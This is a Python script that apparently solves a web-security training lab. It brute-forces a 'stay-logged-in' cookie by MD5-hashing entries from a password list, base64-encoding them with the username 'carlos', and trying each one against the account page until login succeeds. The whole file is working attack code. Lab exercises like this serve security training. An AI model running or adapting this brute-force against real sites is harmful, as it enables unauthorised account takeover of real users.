import requests
import hashlib
import base64
import sys

url = "https://ac6f1f1b1e9441acc0538e1e004700b3.web-security-academy.net"
proxy = {'https':'http:127.0.0.1:8080', 'http':'http:127.0.0.1'}

def genrate_md5_digest(password):
	result = hashlib.md5((f"{password}").encode('utf-8')).hexdigest()
	return result

def write_to_file(cookie):
	with open('cookies.txt','a') as f:
				f.write(cookie+'\n')


def brute_force_cookies(url):
	with open('cookies.txt') as f:
		for cookies in f:
			cookie = cookies.strip()
			s = requests.Session()
			r = s.get(url+'/login')
			session = s.cookies.get_dict()
			session = session.get('session')
			cookies = {'session':f"{session}",'stay-logged-in':f"{cookie}"}
			#print(cookies)
			sys.stdout.write(f"\r[+]Trying {cookies}")
			#debug
			#r = requests.get(url+'/my-account',cookies=cookies, proxies = proxy,verify=False)
			r = s.get(url+'/my-account',cookies=cookies)

			if 'carlos' in r.text:
				print('\n[+]Cracked')

			if r.status_code == 500:
				print('[+]Create New Instance')



def generate_cookie():
	with open('passwords.txt') as f:
		for passwords in f:
			password = passwords.strip()
			result = genrate_md5_digest(password)
			hashed_cookie = f"carlos:{result}"

			#encode cookie
			cookie_encoded = hashed_cookie.encode('ascii')
			cookie_byte =base64.b64encode(cookie_encoded)
			#decode to get cookie
			cookie = cookie_byte.decode('ascii')

			write_to_file(cookie)


def main():
	generate_cookie()
	brute_force_cookies(url)

if __name__=="__main__":
    main()
